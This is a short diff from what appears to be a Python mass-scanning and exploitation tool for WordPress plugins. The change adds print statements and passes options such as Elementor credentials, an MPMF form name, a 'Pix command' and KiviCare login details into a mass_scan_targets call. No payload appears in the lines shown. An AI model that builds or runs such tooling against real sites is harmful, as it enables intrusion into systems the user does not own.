+        if mpmf_form_name:
+            print(f"{GREEN}[+]{RESET} MPMF form name: {mpmf_form_name}")
+        if pix_command:
+            print(f"{GREEN}[+]{RESET} Pix command: {pix_command}")
         print(f"{YELLOW}[!]{RESET} Use only on authorized targets")
     print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop")
     
     try:
-        results = mass_scan_targets(targets, max_workers, exploit, elementor_creds)
+        results = mass_scan_targets(targets, max_workers, exploit, elementor_creds, interactive, mpmf_form_name, pix_command, pix_interactive, kivicare_email, kivicare_login_type)
         
         if results:
             save_option = input(f"\n{YELLOW}[?]{RESET} Save results? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
